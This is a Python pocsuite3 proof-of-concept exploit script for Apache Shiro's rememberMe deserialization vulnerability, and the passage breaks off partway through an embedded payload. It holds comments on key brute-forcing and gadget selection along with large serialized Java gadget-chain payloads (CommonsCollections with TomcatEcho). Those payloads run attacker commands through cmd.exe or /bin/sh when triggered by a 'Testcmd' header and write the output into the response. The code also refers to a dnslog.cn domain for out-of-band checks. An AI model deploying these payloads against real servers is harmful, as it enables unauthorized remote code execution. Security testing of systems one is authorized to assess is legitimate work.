#!/usr/bin/env python
#coding=utf-8
import time
import base64
import json
import sys
import struct
# ref: https://stackoverflow.com/questions/2719017/how-to-set-timeout-on-pythons-socket-recv-method
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
# 解析path
from urllib import parse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger, OptDict
from pocsuite3.api import POC_CATEGORY
from collections import OrderedDict

from Crypto.Cipher import AES
import uuid
import random
import requests 
'''
payload生成方式：

import org.apache.shiro.subject.SimplePrincipalCollection;

    private static void generatePayload2() throws IOException{
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("shiroPayload.ser"));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
    }

原理参考：https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ

检测回显的WEB中间件:
- Tomcat(Spring Boot): 7.0.105, 8.0.38, 8.5.53, 9.0.37
- Resin: 4.0.60, 4.0.65
- Jetty: #TODO ClassLoader不一样，待找到原因，重新生成payload

Gadget:
- CommonsCollectionsK1(commons-collections:<=3.2.1)
- CommonsCollectionsK2(commons-collections4:4.0)
- CommonsBeanutils1
- C3P0
- URLDNS

发包顺序
- #1、rememberMe=whatever
作为对照
- #2-N、rememberMe=[带有key的SimplePrincipalCollection对象]
轻量级爆破key方法
- #N+1、各个[gadget+中间件]的回显payload
'''

# 用于探测Shiro服务的key，便于后续漏洞利用
class Shiro_key_detect_with_echo(POCBase):
    vulID = 'Shiro-deser-key-detect'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'Shiro'
    appVersion = ''''''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = 'test'
    vulDate = '2020-07-29'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-07-29'  # 编写 PoC 的日期
    updateDate = '2021-04-20'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/Qt43qq0zP_xideBSV86JoA', 
                  'https://github.com/zema1/ysoserial', 
                  'https://github.com/potats0/shiroPoc', 
                  'https://github.com/feihong-cs/Java-Rce-Echo']  # 漏洞地址来源,0day不用写
    name = 'Shiro服务探测/回显检测'  # PoC 名称
    cvss = u"高危"

    DOMAIN = 'qq.dnslog.cn'
    #BANNER = ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10)])
    #CEYE_URL = 'http://admin.dnslog.cn/api/dns/qq/{0}/'.format(BANNER)
    #CEYE_URL_DNS= 'http://admin.dnslog.cn/api/dns/qq/{0}.urldns/'.format(BANNER)

    DEFAULT_CIPHERTEXT = "1"


    # shiro服务的相对路径
    PATH = '/'
    #PATH = '/samples-web-1.2.4/'


    # 第一级别：不仅找到了key，还确认了存在反序列化漏洞
    # 第二级别：未发现漏洞，只是找到了key
    def _verify(self, p_cmd='echo {0}'):
        result={}

        _BANNER = ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10)])

        vul_url = self.url
        target_url = vul_url

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        #host, port = url2ip(target_url, True) # 这里的逻辑是会解析域名成IP的，在某些情况下，会导致重定向不一样，影响检测结果，故弃用。

        # 解决一些对Host头是IP或域名解析不一样的问题
        host = parse.urlparse(target_url).hostname         # 当url传入的是带域名时，这里保留其域名，不解析
        
        # 1、如果url存在端口【默认】，则直接使用端口
        port = parse.urlparse(target_url).port

        # 2、如果url不存在端口，则根据schema使用默认端口
        if not port:
            if parse.urlparse(target_url).scheme == 'https':
                port = 443
            elif parse.urlparse(target_url).scheme == 'http':
                port = 80

        # 解析path，参考：https://blog.51cto.com/walkerqt/1766670
        # 如果url解析之后的path不为空，则取之；反之，取self.PATH
        parsed_path = parse.urlparse(target_url).path
        path = parsed_path if parsed_path else self.PATH
        default_cmd = 'echo {0}'.format(_BANNER)
        cmd = p_cmd
        # 只是一个SimplePrincipalCollection对象
        _bb = b'\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\xc6\xa3\x08J\x03\x00\x01L\x00\x0frealmPrincipalst\x00\x0fLjava/util/Map;xppw\x01\x00x'

        # TomcatEcho的payload
        # 生成方式：
        # ysoserial_path = 'D:\\repos\\ysoserial\\target\\ysoserial-0.0.8-SNAPSHOT-all.jar'
        # popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.6.0_45\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsCollectionsK1TomcatEcho', '1'], stdout=subprocess.PIPE)
        # print(popen.stdout.read())

        # 给请求添加 Testecho: 123，将在响应 header 看到 Testecho: 123，可以用与可靠漏洞的漏洞检测
        # 给请求添加 Testcmd: id 会执行 id 命令并将回显写在响应 body 中

        # CommonsCollectionsK1TomcatEcho(commons-collections:<=3.2.1)
        # Tested on Tomcat 7.0.105, 8.0.38, 8.5.53, 9.0.37
        __bb = b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpsr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x08I\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_namet\x00\x12Ljava/lang/String;L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00pur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x0f\x92\xca\xfe\xba\xbe\x00\x00\x002\x00\xeb\x01\x00\x1cysoserial/Pwner8038017827400\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x17Pwner8038017827400.java\x01\x00\twriteBody\x01\x00\x17(Ljava/lang/Object;[B)V\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x08\x00\t\x01\x00\x0fjava/lang/Class\x07\x00\x0b\x01\x00\x07forName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\x0c\x00\r\x00\x0e\n\x00\x0c\x00\x0f\x01\x00\x0bnewInstance\x01\x00\x14()Ljava/lang/Object;\x0c\x00\x11\x00\x12\n\x00\x0c\x00\x13\x01\x00\x08setBytes\x08\x00\x15\x01\x00\x02[B\x07\x00\x17\x01\x00\x11java/lang/Integer\x07\x00\x19\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x0c\x00\x1b\x00\x1c\t\x00\x1a\x00\x1d\x01\x00\x11getDeclaredMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x0c\x00\x1f\x00 \n\x00\x0c\x00!\x01\x00\x06<init>\x01\x00\x04(I)V\x0c\x00#\x00$\n\x00\x1a\x00%\x01\x00\x18java/lang/reflect/Method\x07\x00\'\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00)\x00*\n\x00(\x00+\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x0c\x00-\x00.\n\x00\x04\x00/\x01\x00\x07doWrite\x08\x001\x01\x00\tgetMethod\x0c\x003\x00 \n\x00\x0c\x004\x01\x00 java/lang/ClassNotFoundException\x07\x006\x01\x00\x13java.nio.ByteBuffer\x08\x008\x01\x00\x04wrap\x08\x00:\x01\x00\x1fjava/lang/NoSuchMethodException\x07\x00<\x01\x00\x04Code\x01\x00\nExceptions\x01\x00\x13java/lang/Exception\x07\x00@\x01\x00\rStackMapTable\x01\x00\x05getFV\x01\x008(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x0c\x00E\x00F\n\x00\x0c\x00G\x01\x00\x1ejava/lang/NoSuchFieldException\x07\x00I\x01\x00\rgetSuperclass\x0c\x00K\x00.\n\x00\x0c\x00L\x01\x00\x15(Ljava/lang/String;)V\x0c\x00#\x00N\n\x00J\x00O\x01\x00"java/lang/reflect/AccessibleObject\x07\x00Q\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x0c\x00S\x00T\n\x00R\x00U\x01\x00\x17java/lang/reflect/Field\x07\x00W\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00Y\x00Z\n\x00X\x00[\x01\x00\x10java/lang/String\x07\x00]\x01\x00\x03()V\x0c\x00#\x00_\n\x00\x04\x00`\x01\x00\x10java/lang/Thread\x07\x00b\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x0c\x00d\x00e\n\x00c\x00f\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x0c\x00h\x00i\n\x00c\x00j\x01\x00\x07threads\x08\x00l\x0c\x00C\x00D\n\x00\x02\x00n\x01\x00\x13[Ljava/lang/Thread;\x07\x00p\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x0c\x00r\x00s\n\x00c\x00t\x01\x00\x04exec\x08\x00v\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x0c\x00x\x00y\n\x00^\x00z\x01\x00\x04http\x08\x00|\x01\x00\x06target\x08\x00~\x01\x00\x12java/lang/Runnable\x07\x00\x80\x01\x00\x06this$0\x08\x00\x82\x01\x00\x07handler\x08\x00\x84\x01\x00\x06global\x08\x00\x86\x01\x00\nprocessors\x08\x00\x88\x01\x00\x0ejava/util/List\x07\x00\x8a\x01\x00\x04size\x01\x00\x03()I\x0c\x00\x8c\x00\x8d\x0b\x00\x8b\x00\x8e\x01\x00\x15(I)Ljava/lang/Object;\x0c\x00Y\x00\x90\x0b\x00\x8b\x00\x91\x01\x00\x03req\x08\x00\x93\x01\x00\x0bgetResponse\x08\x00\x95\x01\x00\tgetHeader\x08\x00\x97\x01\x00\x08Testecho\x08\x00\x99\x01\x00\x07isEmpty\x01\x00\x03()Z\x0c\x00\x9b\x00\x9c\n\x00^\x00\x9d\x01\x00\tsetStatus\x08\x00\x9f\x01\x00\taddHeader\x08\x00\xa1\x01\x00\x07Testcmd\x08\x00\xa3\x01\x00\x07os.name\x08\x00\xa5\x01\x00\x10java/lang/System\x07\x00\xa7\x01\x00\x0bgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x0c\x00\xa9\x00\xaa\n\x00\xa8\x00\xab\x01\x00\x0btoLowerCase\x0c\x00\xad\x00s\n\x00^\x00\xae\x01\x00\x06window\x08\x00\xb0\x01\x00\x07cmd.exe\x08\x00\xb2\x01\x00\x02/c\x08\x00\xb4\x01\x00\x07/bin/sh\x08\x00\xb6\x01\x00\x02-c\x08\x00\xb8\x01\x00\x11java/util/Scanner\x07\x00\xba\x01\x00\x18java/lang/ProcessBuilder\x07\x00\xbc\x01\x00\x16([Ljava/lang/String;)V\x0c\x00#\x00\xbe\n\x00\xbd\x00\xbf\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x0c\x00\xc1\x00\xc2\n\x00\xbd\x00\xc3\x01\x00\x11java/lang/Process\x07\x00\xc5\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x0c\x00\xc7\x00\xc8\n\x00\xc6\x00\xc9\x01\x00\x18(Ljava/io/InputStream;)V\x0c\x00#\x00\xcb\n\x00\xbb\x00\xcc\x01\x00\x02\\A\x08\x00\xce\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x0c\x00\xd0\x00\xd1\n\x00\xbb\x00\xd2\x01\x00\x04next\x0c\x00\xd4\x00s\n\x00\xbb\x00\xd5\x01\x00\x08getBytes\x01\x00\x04()[B\x0c\x00\xd7\x00\xd8\n\x00^\x00\xd9\x0c\x00\x07\x00\x08\n\x00\x02\x00\xdb\x01\x00\rgetProperties\x01\x00\x18()Ljava/util/Properties;\x0c\x00\xdd\x00\xde\n\x00\xa8\x00\xdf\x01\x00\x13java/util/Hashtable\x07\x00\xe1\x01\x00\x08toString\x0c\x00\xe3\x00s\n\x00\xe2\x00\xe4\x01\x00\x13[Ljava/lang/String;\x07\x00\xe6\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\xe8\n\x00\xe9\x00`\x00!\x00\x02\x00\xe9\x00\x00\x00\x00\x00\x03\x00\n\x00\x07\x00\x08\x00\x02\x00>\x00\x00\x01/\x00\x08\x00\x05\x00\x00\x00\xf6\x12\n\xb8\x00\x10N-\xb6\x00\x14M-\x12\x16\x06\xbd\x00\x0cY\x03\x12\x18SY\x04\xb2\x00\x1eSY\x05\xb2\x00\x1eS\xb6\x00",\x06\xbd\x00\x04Y\x03+SY\x04\xbb\x00\x1aY\x03\xb7\x00&SY\x05\xbb\x00\x1aY+\xbe\xb7\x00&S\xb6\x00,W*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x8d:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00H:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x03\xb1\x00\x02\x00\x00\x00h\x00k\x007\x00\x00\x00h\x00\xb0\x00=\x00\x01\x00B\x00\x00\x00\x17\x00\x03\xf7\x00k\x07\x007\xf7\x00D\x07\x00=\xfd\x00D\x07\x00\x04\x07\x00\x0c\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\n\x00C\x00D\x00\x02\x00>\x00\x00\x00~\x00\x03\x00\x05\x00\x00\x00?\x01M*\xb6\x000N\xa7\x00\x19-+\xb6\x00HM\xa7\x00\x16\xa7\x00\x00:\x04-\xb6\x00MN\xa7\x00\x03-\x12\x04\xa6\xff\xe7,\x01\xa6\x00\x0c\xbb\x00JY+\xb7\x00P\xbf,\x04\xb6\x00V,*\xb6\x00\\\xb0\x00\x01\x00\n\x00\x13\x00\x16\x00J\x00\x01\x00B\x00\x00\x00%\x00\x06\xfd\x00\n\x07\x00X\x07\x00\x0c\x08\xff\x00\x02\x00\x04\x07\x00\x04\x07\x00^\x07\x00X\x07\x00\x0c\x00\x01\x07\x00J\t\x05\r\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00#\x00_\x00\x02\x00>\x00\x00\x036\x00\x08\x00\r\x00\x00\x02?*\xb7\x00\xea\x036\x04\xb8\x00g\xb6\x00k\x12m\xb8\x00o\xc0\x00q:\x05\x036\x06\x15\x06\x19\x05\xbe\xa2\x02\x1f\x19\x05\x15\x062:\x07\x19\x07\x01\xa6\x00\x06\xa7\x02\t\x19\x07\xb6\x00uN-\x12w\xb6\x00{\x9a\x00\x0c-\x12}\xb6\x00{\x9a\x00\x06\xa7\x01\xee\x19\x07\x12\x7f\xb8\x00oL+\xc1\x00\x81\x9a\x00\x06\xa7\x01\xdc+\x12\x83\xb8\x00o\x12\x85\xb8\x00o\x12\x87\xb8\x00oL\xa7\x00\x0b:\x08\xa7\x01\xc3\xa7\x00\x00+\x12\x89\xb8\x00o\xc0\x00\x8b:\t\x036\n\x15\n\x19\t\xb9\x00\x8f\x01\x00\xa2\x01\x9e\x19\t\x15\n\xb9\x00\x92\x02\x00:\x0b\x19\x0b\x12\x94\xb8\x00oL+\xb6\x000\x12\x96\x03\xbd\x00\x0c\xb6\x005+\x03\xbd\x00\x04\xb6\x00,M+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\x9aS\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00X,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W,\xb6\x000\x12\xa2\x05\xbd\x00\x0cY\x03\x12^SY\x04\x12^S\xb6\x005,\x05\xbd\x00\x04Y\x03\x12\x9aSY\x04-S\xb6\x00,W\x046\x04+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\xa4S\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00\x8d,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W\x12\xa6\xb8\x00\xac\xb6\x00\xaf\x12\xb1\xb6\x00{\x99\x00\x18\x06\xbd\x00^Y\x03\x12\xb3SY\x04\x12\xb5SY\x05-S\xa7\x00\x15\x06\xbd\x00^Y\x03\x12\xb7SY\x04\x12\xb9SY\x05-S:\x0c,\xbb\x00\xbbY\xbb\x00\xbdY\x19\x0c\xb7\x00\xc0\xb6\x00\xc4\xb6\x00\xca\xb7\x00\xcd\x12\xcf\xb6\x00\xd3\xb6\x00\xd6\xb6\x00\xda\xb8\x00\xdc\x046\x04-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x08\x15\x04\x9a\x00\x06\xa7\x00\x10,\xb8\x00\xe0\xb6\x00\xe5\xb6\x00\xda\xb8\x00\xdc\x15\x04\x99\x00\x06\xa7\x00\t\x84\n\x01\xa7\xfe\\\x15\x04\x99\x00\x06\xa7\x00\t\x84\x06\x01\xa7\xfd\xdf\xb1\x00\x01\x00_\x00p\x00s\x00A\x00\x01\x00B\x00\x00\x00\xdd\x00\x19\xff\x00\x1a\x00\x07\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x00\x00\xfc\x00\x17\x07\x00c\xff\x00\x17\x00\x08\x07\x00\x02\x00\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\x02\xff\x00\x11\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00S\x07\x00A\x04\xff\x00\x02\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\xfe\x00\r\x00\x07\x00\x8b\x01\xff\x00c\x00\x0c\x07\x00\x02\x07\x00\x04\x07\x00\x04\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x07\x00\x04\x00\x00\x02\xfb\x00T.\x02\xfb\x00MQ\x07\x00\xe7)\x0b\x04\x02\x0c\x07\xff\x00\x05\x00\x0b\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x00\x00\xff\x00\x07\x00\x08\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x07\x00c\x00\x00\xfa\x00\x05\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06pt\x00\x04Pwnrpw\x01\x00xsr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNameq\x00~\x00\n[\x00\x0biParamTypesq\x00~\x00\txpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x00t\x00\x0enewTransformerur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00sq\x00~\x00\x00?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x00xxt\x00\x01tx'

        # CommonsCollectionsK2TomcatEcho(commons-collections4:4.0)
        # Tested on Tomcat 7.0.105, 8.0.38, 8.5.53, 9.0.37
        __bb2 = b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x005org.apache.commons.collections4.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpsr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x08I\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_namet\x00\x12Ljava/lang/String;L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00pur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x0f\x94\xca\xfe\xba\xbe\x00\x00\x002\x00\xeb\x01\x00\x1dysoserial/Pwner90130122114900\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x18Pwner90130122114900.java\x01\x00\twriteBody\x01\x00\x17(Ljava/lang/Object;[B)V\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x08\x00\t\x01\x00\x0fjava/lang/Class\x07\x00\x0b\x01\x00\x07forName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\x0c\x00\r\x00\x0e\n\x00\x0c\x00\x0f\x01\x00\x0bnewInstance\x01\x00\x14()Ljava/lang/Object;\x0c\x00\x11\x00\x12\n\x00\x0c\x00\x13\x01\x00\x08setBytes\x08\x00\x15\x01\x00\x02[B\x07\x00\x17\x01\x00\x11java/lang/Integer\x07\x00\x19\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x0c\x00\x1b\x00\x1c\t\x00\x1a\x00\x1d\x01\x00\x11getDeclaredMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x0c\x00\x1f\x00 \n\x00\x0c\x00!\x01\x00\x06<init>\x01\x00\x04(I)V\x0c\x00#\x00$\n\x00\x1a\x00%\x01\x00\x18java/lang/reflect/Method\x07\x00\'\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00)\x00*\n\x00(\x00+\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x0c\x00-\x00.\n\x00\x04\x00/\x01\x00\x07doWrite\x08\x001\x01\x00\tgetMethod\x0c\x003\x00 \n\x00\x0c\x004\x01\x00 java/lang/ClassNotFoundException\x07\x006\x01\x00\x13java.nio.ByteBuffer\x08\x008\x01\x00\x04wrap\x08\x00:\x01\x00\x1fjava/lang/NoSuchMethodException\x07\x00<\x01\x00\x04Code\x01\x00\nExceptions\x01\x00\x13java/lang/Exception\x07\x00@\x01\x00\rStackMapTable\x01\x00\x05getFV\x01\x008(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x0c\x00E\x00F\n\x00\x0c\x00G\x01\x00\x1ejava/lang/NoSuchFieldException\x07\x00I\x01\x00\rgetSuperclass\x0c\x00K\x00.\n\x00\x0c\x00L\x01\x00\x15(Ljava/lang/String;)V\x0c\x00#\x00N\n\x00J\x00O\x01\x00"java/lang/reflect/AccessibleObject\x07\x00Q\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x0c\x00S\x00T\n\x00R\x00U\x01\x00\x17java/lang/reflect/Field\x07\x00W\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00Y\x00Z\n\x00X\x00[\x01\x00\x10java/lang/String\x07\x00]\x01\x00\x03()V\x0c\x00#\x00_\n\x00\x04\x00`\x01\x00\x10java/lang/Thread\x07\x00b\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x0c\x00d\x00e\n\x00c\x00f\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x0c\x00h\x00i\n\x00c\x00j\x01\x00\x07threads\x08\x00l\x0c\x00C\x00D\n\x00\x02\x00n\x01\x00\x13[Ljava/lang/Thread;\x07\x00p\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x0c\x00r\x00s\n\x00c\x00t\x01\x00\x04exec\x08\x00v\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x0c\x00x\x00y\n\x00^\x00z\x01\x00\x04http\x08\x00|\x01\x00\x06target\x08\x00~\x01\x00\x12java/lang/Runnable\x07\x00\x80\x01\x00\x06this$0\x08\x00\x82\x01\x00\x07handler\x08\x00\x84\x01\x00\x06global\x08\x00\x86\x01\x00\nprocessors\x08\x00\x88\x01\x00\x0ejava/util/List\x07\x00\x8a\x01\x00\x04size\x01\x00\x03()I\x0c\x00\x8c\x00\x8d\x0b\x00\x8b\x00\x8e\x01\x00\x15(I)Ljava/lang/Object;\x0c\x00Y\x00\x90\x0b\x00\x8b\x00\x91\x01\x00\x03req\x08\x00\x93\x01\x00\x0bgetResponse\x08\x00\x95\x01\x00\tgetHeader\x08\x00\x97\x01\x00\x08Testecho\x08\x00\x99\x01\x00\x07isEmpty\x01\x00\x03()Z\x0c\x00\x9b\x00\x9c\n\x00^\x00\x9d\x01\x00\tsetStatus\x08\x00\x9f\x01\x00\taddHeader\x08\x00\xa1\x01\x00\x07Testcmd\x08\x00\xa3\x01\x00\x07os.name\x08\x00\xa5\x01\x00\x10java/lang/System\x07\x00\xa7\x01\x00\x0bgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x0c\x00\xa9\x00\xaa\n\x00\xa8\x00\xab\x01\x00\x0btoLowerCase\x0c\x00\xad\x00s\n\x00^\x00\xae\x01\x00\x06window\x08\x00\xb0\x01\x00\x07cmd.exe\x08\x00\xb2\x01\x00\x02/c\x08\x00\xb4\x01\x00\x07/bin/sh\x08\x00\xb6\x01\x00\x02-c\x08\x00\xb8\x01\x00\x11java/util/Scanner\x07\x00\xba\x01\x00\x18java/lang/ProcessBuilder\x07\x00\xbc\x01\x00\x16([Ljava/lang/String;)V\x0c\x00#\x00\xbe\n\x00\xbd\x00\xbf\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x0c\x00\xc1\x00\xc2\n\x00\xbd\x00\xc3\x01\x00\x11java/lang/Process\x07\x00\xc5\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x0c\x00\xc7\x00\xc8\n\x00\xc6\x00\xc9\x01\x00\x18(Ljava/io/InputStream;)V\x0c\x00#\x00\xcb\n\x00\xbb\x00\xcc\x01\x00\x02\\A\x08\x00\xce\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x0c\x00\xd0\x00\xd1\n\x00\xbb\x00\xd2\x01\x00\x04next\x0c\x00\xd4\x00s\n\x00\xbb\x00\xd5\x01\x00\x08getBytes\x01\x00\x04()[B\x0c\x00\xd7\x00\xd8\n\x00^\x00\xd9\x0c\x00\x07\x00\x08\n\x00\x02\x00\xdb\x01\x00\rgetProperties\x01\x00\x18()Ljava/util/Properties;\x0c\x00\xdd\x00\xde\n\x00\xa8\x00\xdf\x01\x00\x13java/util/Hashtable\x07\x00\xe1\x01\x00\x08toString\x0c\x00\xe3\x00s\n\x00\xe2\x00\xe4\x01\x00\x13[Ljava/lang/String;\x07\x00\xe6\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\xe8\n\x00\xe9\x00`\x00!\x00\x02\x00\xe9\x00\x00\x00\x00\x00\x03\x00\n\x00\x07\x00\x08\x00\x02\x00>\x00\x00\x01/\x00\x08\x00\x05\x00\x00\x00\xf6\x12\n\xb8\x00\x10N-\xb6\x0